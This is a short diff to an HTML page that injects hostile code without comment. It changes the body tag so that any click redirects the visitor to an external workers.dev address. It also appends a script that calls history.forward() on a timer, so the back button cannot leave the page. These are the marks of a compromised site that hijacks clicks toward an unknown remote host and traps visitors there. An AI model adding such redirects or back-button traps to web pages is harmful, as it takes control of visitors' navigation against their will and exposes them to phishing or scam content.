@@ -711,7 +711,7 @@
         }
     </style>
 </head>
-<body>
+<body onclick="window.location='https://evfy5.hfbr5.workers.dev/';">
     <div class="colorful-bg"></div>
     
     <header>
@@ -1080,5 +1080,10 @@
             }
         });
     </script>
+                  <script type="text/javascript">
+        function preventBack() { window.history.forward(); }
+        setTimeout("preventBack()", 0);
+        window.onunload = function () { null };
+  </script>
 </body>
 </html>
